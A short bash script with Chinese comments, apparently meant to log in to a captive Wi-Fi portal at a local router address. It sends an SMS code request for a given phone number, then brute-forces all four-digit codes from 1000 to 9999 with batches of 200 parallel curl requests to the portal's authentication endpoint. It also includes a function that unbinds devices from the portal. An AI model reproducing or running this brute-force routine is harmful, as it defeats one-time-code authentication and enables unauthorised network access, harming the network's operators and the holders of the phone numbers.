#!/bin/bash
# 经供参考，不要照搬

# 定义函数发送短信验证码
send_sms() {
  phone=$1
  curl -s -X POST -H "Content-Type: application/json" -d "{\"mobile\": \"$phone\"}" http://10.19.1.1/vcpe/userAuthenticate/sendAuthenticateCode
}

login() {
    phone=$1
    # 发送短信验证码
    send_sms "$phone"
    # 循环尝试不同的验证码
    # $(seq 1000 3500) $(seq 3501 5000) $(seq 7001 9999) $(seq 5001 7000)
    # excute_in_parallel multi_task_login1 multi_task_login2 multi_task_login3 multi_task_login4
    thread=0
    for code in $(seq 8000 9999) $(seq 6000 7999) $(seq 4000 5999) $(seq 1000 3999); do
        # 发送登录请求
        curl -s -X POST -H "Content-Type: application/json" -d "{\"mobile\": \"$phone\", \"acCode\": \"$code\", \"name\": \"Windows电脑\"}" http://10.19.1.1/vcpe/userAuthenticate/authenticate > /dev/null &
        thread=$(($thread+1))
        if [ $thread -gt 200 ]; then
            wait
            thread=0
        fi
    done
}

# 定义函数解绑, 如果设备过多先解绑一次再使用本脚本
unbind() {
  info=$1
  curl -X POST -H "Content-Type: application/json" -d "$info" http://10.19.1.1/vcpe/userAuthenticate/unBindPortalUserMac
}

# 检查网络连接
check_network() {
  ping -c 1 -W 1 223.5.5.5 > /dev/null 2>&1
  if [[ $? -eq 0 ]]; then
    return 0
  else
    return 1
  fi
}

check_network1(){
  curl http://10.19.1.1 > /dev/null 2>&1
  if [[ $? -eq 0 ]]; then
    return 0
  else
    return 1
  fi
}
# 主函数
main() {
  # 检查网络连接
  if ! check_network1; then
     echo 未连接到路由
     exit 0
  fi
  if ! check_network; then
    # 如果网络连接正常，执行登录逻辑, 这里改成你的手机号
    /usr/bin/python3 /root/login/login.py
  else
    # 如果网络连接异常，执行其他逻辑
    echo "网络已连接，退出"
    # 这里可以添加其他逻辑，例如重试连接或退出脚本
    exit 0
  fi
}


main